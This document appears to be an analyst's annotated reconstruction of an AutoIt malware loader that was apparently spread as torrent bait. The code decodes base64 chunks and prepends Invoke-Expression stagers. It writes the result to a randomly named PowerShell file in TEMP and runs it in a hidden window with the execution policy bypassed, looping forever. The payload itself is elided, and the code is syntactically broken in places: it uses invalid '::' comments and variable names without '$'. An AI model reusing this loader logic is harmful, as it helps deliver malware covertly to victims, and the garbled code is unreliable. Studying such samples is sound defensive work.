Global $base64Chunks[] = [ _
...
]
Global $handledPID = 0



:: Main function
:: Execute decoded PS1 file
Func InjectPowerShell($p)
    :: Loop over the array concatenating each element and base64 it
    Local $x1 = ""
    For $x2 = 0 To UBound($base64Chunks) - 1
        $x1 &= $base64Chunks[$x2]
    Next
    
    Local $x3 = _Dec($x1)
    
    :: Decode base64 -> text
    $x3 = "$e1 = 'lfdfzpzpiw'" & @CRLF & _
          "$d1 = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($e1))" & @CRLF & _
          "Invoke-Expression $d1" & @CRLF & _
          "$e2 = 'gecwwiswie'" & @CRLF & _
          "$d2 = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($e2))" & @CRLF & _
          "Invoke-Expression $d2" & @CRLF & _
          $x3

    :: PS1 file to write to
    Local pathToTemp = StringRegExpReplace(EnvGet("TEMP"), "\\\d+$", "") 
    If StringRight(pathToTemp, 1) <> "\" Then pathToTemp &= "\"
    Local fileName = pathToTemp & _RandomStr(10) & ".ps1"
    
    :: Write decoded PS1 to file
    FileWrite(fileName, $x3)
    
    :: Enable powershell script execution
    Local executeFile = 'powershell -ExecutionPolicy Bypass -File "' & fileName & '"'
    
    :: Using AutoIt run this file in the current working directory as a hidden window
    Local $y4 = RunWait(executeFile, "", @SW_HIDE)
    
EndFunc




:: Return random string; used when building filename
Func _RandomStr($VXKUEMWBTN_ZTZYVXRFO_SONOIX)
    Local $MJBTONGUPD_UIZBK_UVBCTR = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    Local $_psbn_ZK4Qj_XhE = ""
    For $i = 1 To $VXKUEMWBTN_ZTZYVXRFO_SONOIX
        $_psbn_ZK4Qj_XhE &= StringMid($MJBTONGUPD_UIZBK_UVBCTR, Random(1, StringLen($MJBTONGUPD_UIZBK_UVBCTR), 1), 1)
    Next
    Return $_psbn_ZK4Qj_XhE
EndFunc

:: Return random string; different keyspace than the other same function
Func RandomStr($eEa7i2H_R9_k_4wlWmnALjrV_)
    Local $tBwodeoeyMinglnTbbaejp = "abcdefghijklmnopqrstuvwxyz0123456789"
    Local $_8KeLF_U_ffs3TC = ""
    For $i = 1 To $eEa7i2H_R9_k_4wlWmnALjrV_
        $_8KeLF_U_ffs3TC &= StringMid($tBwodeoeyMinglnTbbaejp, Random(1, StringLen($tBwodeoeyMinglnTbbaejp)), 1)
    Next
    Return $_8KeLF_U_ffs3TC
EndFunc

:: Binary to string
Func _Dec($var_3357)
    Return BinaryToString(_Base64Decode($var_3357), 4)
EndFunc

:: Decodes a base64 string using MSXML2.DomDocument
Func _Base64Decode($pKkevvyiPlecxgqr)
    Local $idPpaetop = ObjCreate("MSXML2.DOMDocument")
    Local $var_3322 = $idPpaetop.createElement("base64")
    $var_3322.dataType = "bin.base64"
    $var_3322.text = $pKkevvyiPlecxgqr
    Return $var_3322.nodeTypedValue
EndFunc

:: Runs forever, check for Process AutoIt3.exe (which is file executable name that executes this file i.e. xxTorrentCovertBooks509.lol)
While True
    Local autoIt3Process = ProcessList("AutoIt3.exe")
    :: [0][0] is AutoIt syntax, where first row is metadata and [0][0] is the number of processes with AutoIt3.exe name
    For $i = 1 To autoIt3Process[0][0]
        InjectPowerShell(autoIt3Process[$i][1])
    Next
    Sleep(1000)
WEnd